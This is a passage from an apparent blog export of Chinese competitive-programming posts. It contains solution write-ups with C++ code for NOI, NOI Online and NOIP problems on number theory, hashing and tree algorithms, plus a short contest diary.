class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n, q;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> l[<span class="number">2</span> * MAXN + <span class="number">1</span>];</span><br><span class="line">std::list&lt;<span class="type">int</span>&gt; a[<span class="number">2</span> * MAXN + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">int</span> <span class="title">read</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> x = <span class="number">0</span>, w = <span class="number">1</span>;</span><br><span class="line">    <span class="type">char</span> ch = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (ch &lt; <span class="string">&#x27;0&#x27;</span> || ch &gt; <span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (ch == <span class="string">&#x27;-&#x27;</span>) w = <span class="number">-1</span>;</span><br><span class="line">        ch = <span class="built_in">getchar</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (ch &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; ch &lt;= <span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">        x = x * <span class="number">10</span> + (ch - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">        ch = <span class="built_in">getchar</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> x * w;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    n = <span class="built_in">read</span>(), q = <span class="built_in">read</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        segment[i] = SegT::<span class="built_in">build</span>(<span class="number">1</span>, <span class="number">2</span> * MAXN);</span><br><span class="line">        l[i] = <span class="built_in">read</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= l[i]; j++) &#123;</span><br><span class="line">            <span class="type">int</span> x;</span><br><span class="line">            x = <span class="built_in">read</span>();</span><br><span class="line">            segment[i]-&gt;<span class="built_in">update</span>(x, <span class="number">1</span>);</span><br><span class="line">            a[i].<span class="built_in">push_back</span>(x);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (q--) &#123;</span><br><span class="line">        <span class="type">int</span> cmd;</span><br><span class="line">        cmd = <span class="built_in">read</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (cmd == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="type">int</span> x, y;</span><br><span class="line">            x = <span class="built_in">read</span>(), y = <span class="built_in">read</span>();</span><br><span class="line">            segment[x]-&gt;<span class="built_in">update</span>(y, <span class="number">1</span>);</span><br><span class="line">            a[x].<span class="built_in">push_back</span>(y);</span><br><span class="line">            l[x]++;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cmd == <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="type">int</span> x;</span><br><span class="line">            x = <span class="built_in">read</span>();</span><br><span class="line">            segment[x]-&gt;<span class="built_in">update</span>(a[x].<span class="built_in">back</span>(), <span class="number">-1</span>);</span><br><span class="line">            a[x].<span class="built_in">pop_back</span>();</span><br><span class="line">            l[x]--;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cmd == <span class="number">3</span>) &#123;</span><br><span class="line">            <span class="type">int</span> m;</span><br><span class="line">            <span class="type">static</span> <span class="type">int</span> x[MAXN + <span class="number">1</span>];</span><br><span class="line">            m = <span class="built_in">read</span>();</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= m; i++) x[i] = <span class="built_in">read</span>();</span><br><span class="line"></span><br><span class="line">            std::pair&lt;<span class="type">long</span> <span class="type">long</span>, <span class="type">int</span>&gt; res = std::<span class="built_in">make_pair</span>(<span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= m; i++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="number">2</span> * segment[x[i]]-&gt;val.first &lt;= l[x[i]]) <span class="keyword">continue</span>;</span><br><span class="line">                std::pair&lt;<span class="type">long</span> <span class="type">long</span>, <span class="type">int</span>&gt; now = std::<span class="built_in">make_pair</span>(segment[x[i]]-&gt;val.first - (l[x[i]] - segment[x[i]]-&gt;val.first), segment[x[i]]-&gt;val.second);</span><br><span class="line">                <span class="keyword">if</span> (now.second == res.second) res.first += now.first;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (now.first == res.first) res = std::<span class="built_in">make_pair</span>(<span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (now.first &gt; res.first) res = std::<span class="built_in">make_pair</span>(now.first - res.first, now.second);</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (now.first &lt; res.first) res.first -= now.first;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (res.first == <span class="number">0</span>) <span class="built_in">puts</span>(<span class="string">&quot;-1&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">long</span> <span class="type">long</span> cnt = <span class="number">0</span>, len = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= m; i++) &#123;</span><br><span class="line">                    cnt += segment[x[i]]-&gt;<span class="built_in">query</span>(res.second).first;</span><br><span class="line">                    len += l[x[i]];</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, <span class="number">2</span> * cnt &gt; len ? res.second : <span class="number">-1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cmd == <span class="number">4</span>) &#123;</span><br><span class="line">            <span class="type">int</span> x1, x2, x3;</span><br><span class="line">            x1 = <span class="built_in">read</span>(), x2 = <span class="built_in">read</span>(), x3 = <span class="built_in">read</span>();</span><br><span class="line"></span><br><span class="line">            segment[x3] = SegT::<span class="built_in">build</span>(<span class="number">1</span>, <span class="number">2</span> * MAXN);</span><br><span class="line">            segment[x3] = SegT::<span class="built_in">merge</span>(segment[x3], segment[x1]);</span><br><span class="line">            segment[x3] = SegT::<span class="built_in">merge</span>(segment[x3], segment[x2]);</span><br><span class="line">            a[x3].<span class="built_in">splice</span>(a[x3].<span class="built_in">end</span>(), a[x1]);</span><br><span class="line">            a[x3].<span class="built_in">splice</span>(a[x3].<span class="built_in">end</span>(), a[x2]);</span><br><span class="line">            l[x3] = l[x1] + l[x2];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>题解</category>
      </categories>
      <tags>
        <tag>2022</tag>
        <tag>OI</tag>
        <tag>题解</tag>
        <tag>数据结构</tag>
        <tag>线段树</tag>
        <tag>权值线段树</tag>
        <tag>线段树合并</tag>
        <tag>NOI</tag>
        <tag>链表</tag>
      </tags>
  </entry>
  <entry>
    <title>「NOI Online 2022 入门组」数学游戏 - 数论</title>
    <url>/noio2022-math/</url>
    <content><![CDATA[<h1 id="题意描述">题意描述</h1>
<p><a href="https://www.luogu.com.cn/problem/P8255">洛谷链接</a></p>
<p>Kri 喜欢玩数字游戏。</p>
<p>一天，他在草稿纸上写下了 <span class="math inline">\(t\)</span>
对正整数 <span class="math inline">\((x,
y)\)</span>，并对于每一对正整数计算出了 <span class="math inline">\(z =
xy \gcd(x, y)\)</span>。</p>
<p>可是调皮的 Zay 找到了 Kri 的草稿纸，并把每一组的 <span
class="math inline">\(y\)</span> 都擦除了，还可能改动了一些 <span
class="math inline">\(z\)</span>。</p>
<p>现在 Kri 想请你帮忙还原每一组的 <span
class="math inline">\(y\)</span>，具体地，对于每一组中的 <span
class="math inline">\(x\)</span> 和 <span
class="math inline">\(z\)</span>，你需要输出最小的正整数 <span
class="math inline">\(z\)</span>，使得 <span class="math inline">\(z =
xy \gcd(x, y)\)</span>。如果这样的 <span
class="math inline">\(y\)</span> 不存在，也就是 Zay 一定改动了 <span
class="math inline">\(z\)</span>，那么请输出 <span
class="math inline">\(-1\)</span>。</p>
<p>数据范围：<span class="math inline">\(1 \le t \le 5 \times
{10}^5\)</span>，<span class="math inline">\(1 \le x \le
{10}^9\)</span>，<span class="math inline">\(1 \le z &lt;
2^{63}\)</span>。</p>
<span id="more"></span>
<h1 id="解题思路">解题思路</h1>
<p>很明显这是一道数论题。</p>
<p>我们可以设 <span class="math inline">\(x = m \gcd(x,
y)\)</span>，<span class="math inline">\(y = n \gcd(x, y)\)</span>，显然
<span class="math inline">\(\gcd(m, n) = 1\)</span>。对于 <span
class="math inline">\(z = xy \gcd(x, y)\)</span>，我们可以变形为 <span
class="math inline">\(\frac{z}{x} = y \gcd(x, y)\)</span>。又显然 <span
class="math inline">\(\gcd(x, y) = \frac{x}{m}\)</span>，<span
class="math inline">\(y = \frac{nx}{m}\)</span>，故该式可变形为 <span
class="math inline">\(\frac{z}{x} = \frac{nx^2}{m^2}\)</span>，即 <span
class="math inline">\(\frac{z}{x^3} = \frac{n}{m^2}\)</span>。又由于
<span class="math inline">\(\gcd(m, n) = 1\)</span>，故两者无相同非
<span class="math inline">\(1\)</span> 因子，故 <span
class="math inline">\(\gcd(m^2, n) = 1\)</span>。故我们可以求出 <span
class="math inline">\(\gcd(z, x^3)\)</span>，从而求出 <span
class="math inline">\(m = \sqrt{\frac{x^3}{\gcd(z, x^3)}}\)</span> 和
<span class="math inline">\(n = \frac{z}{\gcd(z,
x^3)}\)</span>，进而得出答案。</p>
<p>对于无解，由于 <span class="math inline">\(z = xy \gcd(x,
y)\)</span>，且 <span class="math inline">\(y\)</span>, <span
class="math inline">\(\gcd(x, y)\)</span>, <span
class="math inline">\(m\)</span> 均为整数，故我们仅需判断 <span
class="math inline">\(m = \sqrt{\frac{x^3}{\gcd(z, x^3)}}\)</span> 和
<span class="math inline">\(\frac{z}{x}\)</span> 是否为整数即可。</p>
<p>注意一下这里 <span class="math inline">\(x^3\)</span> 可能会超出
<code>long long</code> 的范围，这时我们用 <code>__int128_t</code>
代替一下即可。</p>
<h1 id="代码演示">代码演示</h1>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> ll;</span><br><span class="line"></span><br><span class="line"><span class="function">ll <span class="title">gcd</span><span class="params">(<span class="type">__int128_t</span> a, <span class="type">__int128_t</span> b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (b == <span class="number">0</span>) <span class="keyword">return</span> a;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">gcd</span>(b, a % b);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> t;</span><br><span class="line"></span><br><span class="line">    std::cin &gt;&gt; t;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (t--) &#123;</span><br><span class="line">        ll x, z;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%lld%lld&quot;</span>, &amp;x, &amp;z);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (z % x != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;-1\n&quot;</span>);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ll g = <span class="built_in">gcd</span>(z, (<span class="type">__int128_t</span>)x * x * x);</span><br><span class="line">        ll n = z / g;</span><br><span class="line">        ll m = <span class="built_in">sqrt</span>((<span class="type">__int128_t</span>)x * x * x / g);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">sqrt</span>((<span class="type">__int128_t</span>)x * x * x / g) != m) <span class="built_in">printf</span>(<span class="string">&quot;-1\n&quot;</span>);</span><br><span class="line">        <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>, n * x / m);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>题解</category>
      </categories>
      <tags>
        <tag>2022</tag>
        <tag>OI</tag>
        <tag>题解</tag>
        <tag>数学</tag>
        <tag>数论</tag>
        <tag>NOI Online</tag>
      </tags>
  </entry>
  <entry>
    <title>NOI Online 2022 行记</title>
    <url>/noio2022/</url>
    <content><![CDATA[<p>纪念一下这个 <del>爆炸</del> 的考试</p>
<h1 id="day-0">Day 0</h1>
<p>晚上考完数学考试就到机房刷题。写了几道状压
DP。没过多久就下课了。然后回寝睡觉。</p>
<h1 id="day-1">Day 1</h1>
<p>早上起来后看了一下 DP 题，感觉没啥做的，就看了会儿 B 站
<del>然后发现鸽子 Alan Becker 居然更新了</del>。</p>
<p>没过多久就开始考试，提前开网页，题目加载出来后把题面扔在了我们学校的
OI 群里。</p>
<span id="more"></span>
<p>首先看了一下 T1
丹钓战，<del>谐音梗扣钱</del>。考场上想不出来正解，就胡乱写了暴力。然后再暴力的基础上优化了一下，预处理了可使
<span class="math inline">\((a_i, b_i)\)</span>
成为成功的二元组的最近的下标，复杂度优化到了 <span
class="math inline">\(O(n^2)\)</span>。</p>
<p>然后看了一下 T3，感觉考得是多项式之类的题，没学过，就打了一个 <span
class="math inline">\(O(n^3)\)</span> 的暴力走人了。</p>
<p>最后看了 T2，想着用图论搞，就建了一个无向图，写了一个用 bitset 优化的
Floyd 传递闭包，最后用 bitset
检测集合是否互相包含，不包含就输出答案。复杂度大概是 <span
class="math inline">\(O(\frac{n^3}{w})\)</span>。</p>
<h1 id="day-1.5">Day 1.5</h1>
<p>下午考入门组，题目简单一点。考试前不想刷题，就看了会儿群。没过多久就开始考试了。</p>
<p>T1 是水题，很快就切掉了。</p>
<p>T2 想了一下，一道比较有意思的数论题，用 <span
class="math inline">\(\gcd\)</span>
乱搞一下就可以了。有点怕中间程序爆精度，就开了
<code>__int128_t</code>。</p>
<p>T3 感觉是 Trie 或者是 AC
自动机，没学过就没管了。<del>没想到是跟这些没啥关系的 DP 题</del></p>
<p>后来看了洛谷，真的没想到这次的入门组难度评级是红蓝蓝。。。</p>
<h1 id="day">Day ???</h1>
<p>分数线出来了。提高组 100 分，入门组 140 分。</p>
<p>我的成绩提高组 70，入门组 200。。。</p>
]]></content>
      <categories>
        <category>日常</category>
        <category>行记</category>
      </categories>
      <tags>
        <tag>日常</tag>
        <tag>行记</tag>
        <tag>2022</tag>
        <tag>NOI Online</tag>
      </tags>
  </entry>
  <entry>
    <title>「NOIP2012」同余方程 - 拓展欧几里得定理</title>
    <url>/noip2012-mod/</url>
    <content><![CDATA[<h1 id="题意描述">题意描述</h1>
<p><a href="https://www.luogu.com.cn/problem/P1082">洛谷链接</a></p>
<p><a href="https://loj.ac/p/2605">LibreOJ 链接</a></p>
<p>求关于 <span class="math inline">\(x\)</span> 的同余方程 <span
class="math inline">\(ax \equiv 1 \pmod {b}\)</span>
的最小正整数解。</p>
<span id="more"></span>
<h1 id="解题思路">解题思路</h1>
<p>很简单的拓展欧几里得板子题，我们可以由同余方程得出下列等式</p>
<p><span class="math display">\[
ax + by = \gcd(a, b) \quad a, b \in \mathbb{Z}
\]</span></p>
<p>利用拓展欧几里得定理求出 <span class="math inline">\(x\)</span>
即可。对于本题 <span class="math inline">\(\gcd(a, b) \neq 1\)</span>
的情况，只需在等式左右除以一个 <span class="math inline">\(\gcd(a,
b)\)</span>，最后结果乘上 <span class="math inline">\(\gcd(a,
b)\)</span> 即可。</p>
<h1 id="代码演示">代码演示</h1>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">exgcd</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b, <span class="type">int</span> &amp;x, <span class="type">int</span> &amp;y)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!b) &#123;</span><br><span class="line">        x = <span class="number">1</span>;</span><br><span class="line">        y = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> d = <span class="built_in">exgcd</span>(b, a % b, x, y);</span><br><span class="line">    <span class="type">int</span> t = x;</span><br><span class="line">    x = y;</span><br><span class="line">    y = t - (a / b) * y;</span><br><span class="line">    <span class="keyword">return</span> d;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">gcd</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (b == <span class="number">0</span>) <span class="keyword">return</span> a;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">gcd</span>(b, a % b);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> a, b;</span><br><span class="line">    std::cin &gt;&gt; a &gt;&gt; b;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> x, y;</span><br><span class="line">    <span class="built_in">exgcd</span>(a / <span class="built_in">gcd</span>(a, b), b / <span class="built_in">gcd</span>(a, b), x, y);</span><br><span class="line"></span><br><span class="line">    std::cout &lt;&lt; (x % b + b) % <span class="function">b * <span class="title">gcd</span><span class="params">(a, b)</span> &lt;&lt; std::endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>题解</category>
      </categories>
      <tags>
        <tag>NOIP</tag>
        <tag>OI</tag>
        <tag>题解</tag>
        <tag>数学</tag>
        <tag>数论</tag>
        <tag>2012</tag>
      </tags>
  </entry>
  <entry>
    <title>「NOIP2014」解方程 - 数论 + Hash</title>
    <url>/noip2014-equation/</url>
    <content><![CDATA[<h1 id="题意描述">题意描述</h1>
<p><a href="https://www.luogu.com.cn/problem/P2312">洛谷链接</a></p>
<p><a href="https://loj.ac/p/2503">LibreOJ 链接</a></p>
<p>已知多项式方程：</p>
<p><span
class="math display">\[a_0+a_1x+a_2x^2+\cdots+a_nx^n=0\]</span></p>
<p>求这个方程在 <span class="math inline">\([1,m]\)</span>
内的整数解（<span class="math inline">\(n\)</span> 和 <span
class="math inline">\(m\)</span> 均为正整数）。</p>
<span id="more"></span>
<h1 id="解题思路">解题思路</h1>
<p>这道题数据范围过大，显然我们无法用正常思路解决。而 <span
class="math inline">\(m\)</span> 的数据范围不大，于是我们可以尝试枚举
<span class="math inline">\(x\)</span> 来得出答案。</p>
<p>通过同余性质我们可以知道，对于一个数 <span
class="math inline">\(p\)</span>，如果 <span
class="math inline">\(\sum_{i = 0}^n{a_ix^i} = 0\)</span>，则 <span
class="math inline">\(\sum_{i = 0}^n{a_ix^i} \equiv 0 \pmod
p\)</span>。于是我们可以用 Hash 的思想解决这道题。</p>
<p>我们可以将 <span class="math inline">\(a_ix^i \bmod p\)</span>
存储累加，然后最后于 0 比较即可。如果担心被卡可以使用多模数
Hash（虽然这道题经过测试只需要 <span
class="math inline">\(998244353\)</span> 这个模数可过）。</p>
<p>这道题可以用秦九昭公式进一步优化，但 whk 数学还没学到那就没写了
QWQ</p>
<h1 id="代码演示">代码演示</h1>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXN = <span class="number">100</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MOD = <span class="number">998244353</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">long</span> <span class="type">long</span> <span class="title">read</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> x = <span class="number">0</span>, w = <span class="number">1</span>;</span><br><span class="line">    <span class="type">char</span> ch = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (ch &lt; <span class="string">&#x27;0&#x27;</span> || ch &gt; <span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (ch == <span class="string">&#x27;-&#x27;</span>) w = <span class="number">-1</span>;</span><br><span class="line">        ch = <span class="built_in">getchar</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (ch &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; ch &lt;= <span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">        x = (x * <span class="number">10</span> + (ch - <span class="string">&#x27;0&#x27;</span>)) % MOD;</span><br><span class="line">        ch = <span class="built_in">getchar</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> x * w;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n, m;</span><br><span class="line">    <span class="type">static</span> <span class="type">long</span> <span class="type">long</span> a[MAXN + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= n; i++) a[i] = <span class="built_in">read</span>();</span><br><span class="line"></span><br><span class="line">    <span class="type">static</span> std::vector&lt;<span class="type">int</span>&gt; ans;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= m; i++) &#123;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> res = <span class="number">0</span>, p = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt;= n; j++) &#123;</span><br><span class="line">            res = (res + (a[j] * p) % MOD) % MOD;</span><br><span class="line">            p = (p * i) % MOD;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (res == <span class="number">0</span>) ans.<span class="built_in">push_back</span>(i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%zu\n&quot;</span>, ans.<span class="built_in">size</span>());</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> each : ans) <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, each);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>题解</category>
      </categories>
      <tags>
        <tag>NOIP</tag>
        <tag>OI</tag>
        <tag>题解</tag>
        <tag>数学</tag>
        <tag>Hash</tag>
        <tag>数论</tag>
        <tag>2014</tag>
      </tags>
  </entry>
  <entry>
    <title>「NOIP2015」运输计划 - 二分答案 + 最近公共祖先 + 树上差分</title>
    <url>/noip2015-transport/</url>
    <content><![CDATA[<h1 id="题意描述">题意描述</h1>
<p><a href="https://www.luogu.com.cn/problem/P2680">洛谷链接</a></p>
<p><a href="https://loj.ac/p/2425">LibreOJ 链接</a></p>
<p>公元 <span class="math inline">\(2044\)</span>
年，人类进入了宇宙纪元。</p>
<p>L 国有 <span class="math inline">\(n\)</span> 个星球，还有 <span
class="math inline">\(n - 1\)</span>
条双向航道，每条航道建立在两个星球之间，这 <span class="math inline">\(n
- 1\)</span> 条航道连通了 L 国的所有星球。</p>
<p>小 P
掌管一家物流公司，该公司有很多个运输计划，每个运输计划形如：有一艘物流飞船需要从
<span class="math inline">\(u_i\)</span> 号星球沿最快的宇航路径飞行到
<span class="math inline">\(v_i\)</span>
号星球去。显然，飞船驶过一条航道是需要时间的，对于航道 <span
class="math inline">\(j\)</span>，任意飞船驶过它所花费的时间为 <span
class="math inline">\(t_j\)</span>，并且任意两艘飞船之间不会产生任何干扰。</p>
<p>为了鼓励科技创新，L 国国王同意小 P 的物流公司参与 L
国的航道建设，即允许小 P
把某一条航道改造成虫洞，飞船驶过虫洞不消耗时间。</p>
<p>在虫洞的建设完成前小 P 的物流公司就预接了 <span
class="math inline">\(m\)</span> 个运输计划。在虫洞建设完成后，这 <span
class="math inline">\(m\)</span>
个运输计划会同时开始，所有飞船一起出发。当这 <span
class="math inline">\(m\)</span> 个运输计划都完成时，小 P
的物流公司的阶段性工作就完成了。</p>
<p>如果小 P 可以自由选择将哪一条航道改造成虫洞，试求出小 P
的物流公司完成阶段性工作所需要的最短时间是多少?</p>
<span id="more"></span>
<h1 id="解题思路">解题思路</h1>
<p>本题实质上是将一棵树中的一条边的权值设为 <span
class="math inline">\(0\)</span>，使 <span
class="math inline">\(m\)</span>
条最大路径长度最小。显然可以想到二分答案。</p>
<p>我们可以二分最长路径的长度。设最长长度为 <span
class="math inline">\(\text{limit}\)</span>，我们可以得出：对于所有长度大于
<span class="math inline">\(\text{limit}\)</span>
的路径，我们必须删去这些路径的最长公共边。判断删去这条公共边后所有路径长度是否小于
<span
class="math inline">\(\text{limit}\)</span>，这样不停二分出答案即可。</p>
<p>但直接找出公共边的时间复杂度过高，又由于这是一颗树，于是我们可以用
LCA + 树上差分解决。对于一条路径，我们可以在其两端点标记 <span
class="math inline">\(+1\)</span>，在两端点的 LCA 标记 <span
class="math inline">\(-2\)</span>，最后树上求前缀和，边上标记数即代表了这是多少条路径的公共边。</p>
<h1 id="代码演示">代码演示</h1>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXN = <span class="number">300000</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> LOG_MAXN = <span class="number">19</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span> &#123;</span><br><span class="line">    std::vector&lt;<span class="keyword">struct</span> Edge&gt; e;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">Edge</span> *in;</span><br><span class="line">    Node *f[LOG_MAXN + <span class="number">1</span>], *p;</span><br><span class="line">    <span class="type">int</span> d, sum, mark;</span><br><span class="line">&#125; N[MAXN + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Edge</span> &#123;</span><br><span class="line">    Node *s, *t;</span><br><span class="line">    <span class="type">int</span> w, mark;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Edge</span>(Node *s, Node *t, <span class="type">int</span> w) : <span class="built_in">s</span>(s), <span class="built_in">t</span>(t), <span class="built_in">w</span>(w) &#123;&#125;</span><br><span class="line">&#125; *E[MAXN + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Path</span> &#123;</span><br><span class="line">    Node *u, *v, *p;</span><br><span class="line">    <span class="type">int</span> dist;</span><br><span class="line">&#125; P[MAXN + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line">Node *tasks[MAXN + <span class="number">1</span>][<span class="number">2</span>];</span><br><span class="line"><span class="type">int</span> maxDist;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">addEdge</span><span class="params">(<span class="type">int</span> s, <span class="type">int</span> t, <span class="type">int</span> w)</span> </span>&#123;</span><br><span class="line">    N[s].e.<span class="built_in">push_back</span>(<span class="built_in">Edge</span>(&amp;N[s], &amp;N[t], w));</span><br><span class="line">    N[t].e.<span class="built_in">push_back</span>(<span class="built_in">Edge</span>(&amp;N[t], &amp;N[s], w));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">prepare</span><span class="params">(Node *v, Node *f = <span class="literal">NULL</span>)</span> </span>&#123;</span><br><span class="line">    